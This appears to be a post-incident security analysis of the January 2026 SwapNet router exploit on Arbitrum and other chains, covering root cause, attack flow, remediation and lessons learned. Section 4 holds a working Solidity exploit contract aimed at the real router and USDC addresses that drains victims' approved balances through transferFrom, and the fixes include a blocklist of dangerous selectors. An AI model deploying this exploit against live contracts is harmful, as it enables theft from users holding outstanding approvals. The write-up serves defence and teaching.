# SwapNet — Arbitrary External Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2026-01-25 |
| **Protocol** | SwapNet (DEX Aggregator) |
| **Chain** | Arbitrum (+ Base, BSC, Ethereum — Multi-chain Attack) |
| **Loss** | $13,410,000 (20 victims, single largest loss $13.34M) |
| **Attacker** | [0x6cAa...833e](https://arbiscan.io/address/0x6cAad74121bF602e71386505A4687f310e0D833e) |
| **Attack Contract** | [0xcCE2...225b](https://arbiscan.io/address/0xcCE2E1a23194bD50d99eB830af580Df0B7e3225b) |
| **Attack Tx** | [0x25c0...8cbb](https://arbiscan.io/tx/0x25c08b3882ade18cbb) |
| **Vulnerable Contract** | [0x6160...757e](https://arbiscan.io/address/0x616000e384Ef1C2B52f5f3A88D57a3B64F23757e) |
| **Root Cause** | Unvalidated arbitrary external call in router contract enables theft of approved tokens |
| **References** | [BlockSec Analysis](https://blocksec.com/blog/17m-closed-source-smart-contract-exploit-arbitrary-call-swapnet-aperture) · [Verichains Analysis](https://blog.verichains.io/p/swapnet-exploit-analysis) · [ExVul Analysis](https://exvul.com/blog/swapnet-attack-analysis) |

---

## 1. Vulnerability Overview

SwapNet is a multi-chain DEX aggregator supporting Arbitrum, Base, BSC, and Ethereum. Users grant infinite token approvals (approve) to the SwapNet router contract to execute swaps.

On January 25, 2026, an attacker exploited an **Arbitrary External Call vulnerability** in the router's internal swap function `0x87395540()` to directly drain tokens from victims who had granted approvals to the router.

The core vulnerability is a single flaw:

- **No validation of call target address**: When the `0x87395540()` function determines the external call target address (`v75`) from user-supplied arguments, it performs no validation whatsoever to check whether that address is an approved DEX router. The attacker replaced this target address with the USDC token contract address and crafted the calldata as `transferFrom(victim, attacker, amount)` to directly drain the victim's balance.

The fact that SwapNet's router contract was deployed without verified source code on block explorers — making community code review impossible in advance — was also a contributing factor that amplified the damage.

---

## 2. Vulnerable Code Analysis

### 2.1 No Validation of Arbitrary Call Target (Core Vulnerability)

SwapNet's router swap function routes multi-hop swaps through multiple DEX protocols. Analysis of the decompiled bytecode revealed the following pattern:

```solidity
// ❌ Vulnerable code (inferred — source unverified, reverse-engineered from bytecode)
// Function selector: 0x87395540
function swap(
    uint8 routeType,       // Routing type identifier
    address target,        // ❌ Call target address — user-controlled, no validation
    bytes calldata data    // ❌ Calldata — user-controlled, no validation
) external payable {
    // Internal branching based on routeType
    // ...
    
    // ❌ Critical flaw: no check that target is in the approved DEX router list
    // ❌ No check that data does not contain dangerous selectors like transferFrom
    (bool success, ) = target.call{value: msg.value}(data);
    require(success, "Swap failed");
}
```

```solidity
// ✅ Fixed code: whitelist + dangerous selector blocking
// Approved DEX router address list
mapping(address => bool) public approvedTargets;

// Blocked function selector list
mapping(bytes4 => bool) public blockedSelectors;

constructor() {
    // Pre-register dangerous selectors
    blockedSelectors[bytes4(keccak256("transferFrom(address,address,uint256)"))] = true;
    blockedSelectors[bytes4(keccak256("approve(address,uint256)"))] = true;
    blockedSelectors[bytes4(keccak256("transfer(address,uint256)"))] = true;
}

function swap(
    uint8 routeType,
    address target,
    bytes calldata data
) external payable {
    // ✅ Whitelist validation of call target address
    require(approvedTargets[target], "Unapproved call target: only registered DEX routers allowed");
    
    // ✅ Block dangerous function selectors
    bytes4 selector = bytes4(data[:4]);
    require(!blockedSelectors[selector], "Blocked selector: transferFrom/approve/transfer calls not permitted");
    
    (bool success, ) = target.call{value: msg.value}(data);
    require(success, "Swap failed");
}
```

**Issue**: The router contract uses a user-supplied address as the external call target without validating the legitimacy of that address. The attacker replaced this address with the USDC token contract and crafted the calldata as `transferFrom(victim_address, attacker_address, full_approved_balance)`. Because the router holds token approvals from victims, this `transferFrom` call succeeded.

---

## 3. Attack Flow

### 3.1 Preconditions

- Victims had previously granted infinite token approvals to the SwapNet router (`0x616000...757e`) during normal transactions
- Attacker had pre-deployed the attack contract (`0xcCE2E1...225b`)

### 3.2 Execution Steps

1. **Target selection**: Attacker collects a list of addresses holding large token approvals to the router via on-chain event logs
2. **Malicious parameter construction**: Prepares crafted parameters with `target = USDC_contract_address`, `data = transferFrom(victim, attacker, balance)`
3. **Call `0x87395540()`**: Attack contract calls SwapNet router's swap function
4. **Router executes call to USDC**: Router calls the USDC contract as the target without validation, executing `transferFrom`
5. **Token transfer succeeds**: USDC contract confirms `allowance[victim][router] >= amount` and transfers tokens
6. **Repeat**: Attacker repeats the same process for 20 victims (multi-chain)
7. **Money laundering**: Swaps approximately $10.5M of stolen USDC into ~3,655 ETH, then bridges to Ethereum mainnet

```
Attack Flow Diagram
═══════════════════════════════════════════════════════════════

  ┌─────────────────────────┐
  │   Attacker EOA           │
  │ 0x6cAa...833e           │
  └───────────┬─────────────┘
              │ (1) Call attack contract
              ▼
  ┌─────────────────────────┐
  │   Attack Contract        │
  │ 0xcCE2...225b           │
  └───────────┬─────────────┘
              │ (2) Call 0x87395540()
              │     target  = USDC address
              │     data    = transferFrom(victim, attacker, amount)
              ▼
  ┌─────────────────────────────────────────────────────────┐
  │              SwapNet Router (Vulnerable Contract)        │
  │           0x616000...757e                               │
  │                                                         │
  │  function swap(routeType, target, data) {               │
  │    // ❌ No target validation                            │
  │    target.call(data)  ◄─── USDC.transferFrom() executed │
  │  }                                                      │
  └─────────────────┬───────────────────────────────────────┘
                    │ (3) USDC.transferFrom(victim, attacker, amount)
                    │     Succeeds because router holds victim's approval
                    ▼
  ┌─────────────────────────┐       ┌──────────────────────┐
  │   USDC Token Contract   │       │   Victim Wallet       │
  │ (Arbitrum)              │  ◄────│ allowance[victim]     │
  │                         │       │ [router] = infinite   │
  │ transferFrom succeeded  │       └──────────────────────┘
  └──────────┬──────────────┘
             │ (4) Victim balance → transferred to attacker
             ▼
  ┌─────────────────────────┐
  │   Attacker Wallet        │
  │ Receives $13.41M USDC   │
  └──────────┬──────────────┘
             │ (5) USDC → ETH swap (~$10.5M)
             │     Bridge to ETH mainnet then launder
             ▼
  ┌─────────────────────────┐
  │   Ethereum Mainnet       │
  │ Holds ~3,655 ETH         │
  └─────────────────────────┘

  ※ Same pattern repeated on Base, BSC, and Ethereum
  ※ ~45 minutes elapsed until protocol pause — 13 additional victims

═══════════════════════════════════════════════════════════════
```

### 3.3 Outcome

- **Attacker profit**: $13,410,000 in USDC/tokens
- **Victims**: 20 (single largest loss: ~$13.34M)
- **SwapNet response**: Paused contracts on all chains 45 minutes after the first attack (Base block #41,289,829)
- **Fund tracking**: ~$10.5M converted to ETH, bridged to Ethereum mainnet

---

## 4. PoC Core Logic (Reproduction)

No public PoC exists; core attack logic is reproduced based on technical analysis.

```solidity
// SwapNet Arbitrary External Call Attack — Core Logic Reproduction
// Chain: Arbitrum

interface ISwapNetRouter {
    // Vulnerable function selector: 0x87395540
    function swap(
        uint8 routeType,
        address target,      // ❌ Call target — no validation
        bytes calldata data  // ❌ Calldata — no validation
    ) external payable;
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract SwapNetAttack {
    // SwapNet Router (Arbitrum)
    ISwapNetRouter constant ROUTER = ISwapNetRouter(0x616000e384Ef1C2B52f5f3A88D57a3B64F23757e);
    
    // Target token (Arbitrum USDC)
    IERC20 constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);

    function exploit(address[] calldata victims) external {
        for (uint256 i = 0; i < victims.length; i++) {
            address victim = victims[i];
            
            // Step 1: Query victim's router approval balance
            uint256 allowance = USDC.allowance(victim, address(ROUTER));
            uint256 balance = USDC.balanceOf(victim);
            
            // Step 2: Calculate actual drainable amount (lesser of allowance and balance)
            uint256 amount = allowance < balance ? allowance : balance;
            if (amount == 0) continue;
            
            // Step 3: Assemble malicious calldata
            // target = USDC token address (instead of a legitimate DEX router address)
            address maliciousTarget = address(USDC);
            
            // data = transferFrom(victim, attacker, amount)
            bytes memory maliciousData = abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                victim,        // from: victim
                msg.sender,    // to: attacker
                amount         // amount: full approved balance
            );
            
            // Step 4: Call router swap function
            // Router executes target(=USDC).call(data) without validation
            // From USDC's perspective, allowance[victim][ROUTER] condition is met — succeeds
            ROUTER.swap(
                1,                  // routeType (arbitrary value)
                maliciousTarget,    // ❌ Replaced with USDC address
                maliciousData       // ❌ Encoded transferFrom
            );
            
            // Step 5: Victim's balance transferred to attacker
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Unvalidated call target address (Arbitrary External Call) | CRITICAL | CWE-20 (Improper Input Validation) | `patterns/03_access_control.md` |
| V-02 | No blocking of dangerous function selectors | CRITICAL | CWE-285 (Improper Authorization) | `patterns/07_token_integration.md` |
| V-03 | Architecture dependent on infinite token approvals | HIGH | CWE-284 (Improper Access Control) | `patterns/07_token_integration.md` |
| V-04 | Unverified source code deployment (lack of transparency) | MEDIUM | CWE-656 (Reliance on Security Through Obscurity) | — |

### V-01: Unvalidated Call Target Address (Arbitrary External Call)

- **Description**: The router's `0x87395540()` function uses a user-supplied `target` address as the external call destination without validating whether that address is in the approved DEX protocol list. An attacker can set `target` to a token contract to exploit the `allowance` held by the router.
- **Impact**: Tokens of all users who have granted approvals to the router can be drained. In particular, users who granted infinite approvals expose their entire balance.
- **Attack Conditions**: (1) Victim holds an ERC20 token approval for the router contract, (2) Attacker can call the `0x87395540()` function with arbitrary parameters.

### V-02: No Blocking of Dangerous Function Selectors

- **Description**: There is no logic to parse the function selector from user-supplied `data` and block token transfer-related function calls such as `transferFrom`, `approve`, or `transfer`.
- **Impact**: Combined with V-01, this completes the token theft vector. Selector blocking alone could have prevented half of this attack.
- **Attack Conditions**: Same as V-01.

### V-03: Architecture Dependent on Infinite Token Approvals

- **Description**: SwapNet's UX design encouraged users to grant infinite approvals. This maximizes the potential damage when a router vulnerability is exploited.
- **Impact**: A single vulnerability can cause tens of millions of dollars in losses — a structural risk. If approvals had been finite, damage would have been limited to the swap amount.
- **Attack Conditions**: User has already granted infinite approval.

### V-04: Unverified Source Code Deployment (Lack of Transparency)

- **Description**: SwapNet's router contract was deployed without verified source code on block explorers, making prior code review by the community and security researchers impossible.
- **Impact**: The vulnerability went undiscovered in advance, and immediate analysis after the incident was also delayed.
- **Attack Conditions**: Attacker possessed bytecode decompilation skills or leveraged insider information.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Enforce call target whitelist
mapping(address => bool) public approvedDexTargets;

// Admin registers only approved DEX routers
function setApprovedTarget(address target, bool approved) external onlyOwner {
    approvedDexTargets[target] = approved;
    emit TargetApprovalUpdated(target, approved);
}

// ✅ Fix 2: Dangerous selector blocklist
bytes4 constant TRANSFER_FROM_SELECTOR = bytes4(keccak256("transferFrom(address,address,uint256)"));
bytes4 constant APPROVE_SELECTOR       = bytes4(keccak256("approve(address,uint256)"));
bytes4 constant TRANSFER_SELECTOR      = bytes4(keccak256("transfer(address,uint256)"));

// ✅ Fix 3: Add validation to swap function
function swap(
    uint8 routeType,
    address target,
    bytes calldata data
) external payable {
    // Validation 1: Whitelist check
    require(approvedDexTargets[target], "SwapNet: Unapproved call target");
    
    // Validation 2: Block dangerous selectors
    if (data.length >= 4) {
        bytes4 sel = bytes4(data[:4]);
        require(
            sel != TRANSFER_FROM_SELECTOR &&
            sel != APPROVE_SELECTOR &&
            sel != TRANSFER_SELECTOR,
            "SwapNet: Blocked function selector"
        );
    }
    
    (bool success, ) = target.call{value: msg.value}(data);
    require(success, "SwapNet: Swap failed");
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Unvalidated call target | Introduce DEX router address whitelist, manage list via governance |
| V-02 No dangerous selector blocking | Explicitly block `transferFrom`, `approve`, `transfer` selectors; consider allowlist-based approach |
| V-03 Infinite approval architecture | Adopt Permit2 (EIP-2612) single-use authorization; encourage minimum approval based on swap amount |
| V-04 Unverified source code | Mandate source code verification on Etherscan/Arbiscan; publish audit reports |

**Additional Recommendations**:
- **Strengthen emergency pause mechanism**: Build automated pause on anomaly detection or rapid manual response capability (this incident caused 45 minutes of additional damage)
- **Introduce swap rate limits**: Cap maximum withdrawal amount per address per unit time
- **On-chain monitoring**: Real-time alert system for abnormal `allowance` usage patterns

---

## 7. Lessons Learned

1. **Arbitrary external calls are one of the most dangerous patterns in DeFi**: When aggregator/router contracts execute user-supplied addresses and calldata without validation, every `allowance` held by the contract becomes an attack vector. Call targets must always be restricted to a whitelist.

2. **Token selector blocking is an essential line of defense**: Explicitly blocking `transferFrom`, `approve`, and `transfer` selectors from external call calldata alone can prevent a significant portion of this attack class. However, this is not a replacement for whitelisting — it is part of defense-in-depth.

3. **Infinite approvals amplify protocol risk**: An architecture reliant on infinite approvals allows a single router vulnerability to result in tens of millions of dollars in losses. Single-use approval mechanisms like Permit2 or minimum approval patterns based on swap amount should be actively adopted.

4. **Source code verification is a security baseline**: Contracts without publicly verified source code on block explorers cannot be audited by the community. Closed-source deployment eliminates the opportunity for early vulnerability discovery and undermines user trust.

5. **Emergency response speed determines the scale of damage**: In this incident, approximately 45 minutes elapsed between the initial attack and the protocol pause, during which 13 additional victims were affected. On-chain anomaly detection systems and automatic circuit breakers are necessary.

6. **Multi-chain deployment linearly expands the attack surface**: When the same vulnerable contract is deployed across multiple chains, a single attacker can exploit every chain sequentially. Independent per-chain pause mechanisms and cross-chain state synchronization monitoring are required.

---

## 8. On-Chain Verification

> This analysis was prepared based on publicly available technical reports (BlockSec, Verichains, ExVul). Direct `cast` verification was not performed due to restricted public RPC access.

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | Reported Value | Source | Notes |
|------|-----------|------|------|
| Total Loss | $13,410,000 | BlockSec/ExVul | SwapNet only |
| Largest Single Loss | $13,340,000 | BlockSec | 1 victim |
| Number of Victims | 20 | BlockSec | Multi-chain total |
| Attacker ETH Conversion | ~3,655 ETH ($10.5M) | Verichains | USDC → ETH swap |
| Aperture Finance Related Loss | $3,670,000 | BlockSec | Same attacker, separate incident |
| Total Combined Loss | ~$17,080,000 | BlockSec | SwapNet + Aperture |

### 8.2 Attack Timeline

| Time (UTC) | Event | Chain |
|-----------|--------|------|
| T+0 | First attack transaction | Base (Block #41,289,829) |
| T+0 ~ T+45min | 13 additional victims | Base, BSC, Arbitrum |
| T+45min | SwapNet pauses contracts on all chains | — |
| T+X | Stolen USDC swapped to ~3,655 ETH | — |
| T+X | ETH bridged to Ethereum mainnet | — |
| T+2026-01-27 | Attacker launders $2.4M via Tornado Cash (Aperture Finance) | ETH |

### 8.3 Key Attack Parameters

```
Vulnerable function:  0x87395540()
Call target replaced: Legitimate DEX router address → USDC token address
Malicious calldata:   transferFrom(victim_address, attacker_address, approved_balance)
Attack success condition: allowance[victim][router] > 0
```

### 8.4 Similar Attack Cases

This vulnerability pattern was also applied by the same attacker against Aperture Finance (`0x67b34120()`) to steal an additional $3.67M. Arbitrary external call vulnerabilities are a repeatedly observed pattern across DeFi aggregators:

| Protocol | Date | Loss | Pattern |
|---------|------|------|------|
| SushiSwap RouteProcessor | 2023-04-09 | $3.3M | Arbitrary call target |
| SwapNet | 2026-01-25 | $13.4M | Arbitrary call target |
| Aperture Finance | 2026-01-26 | $3.67M | Arbitrary call target |
| z0r0z V4 Router | 2026-03 | Undisclosed | Allowance infiltration vector |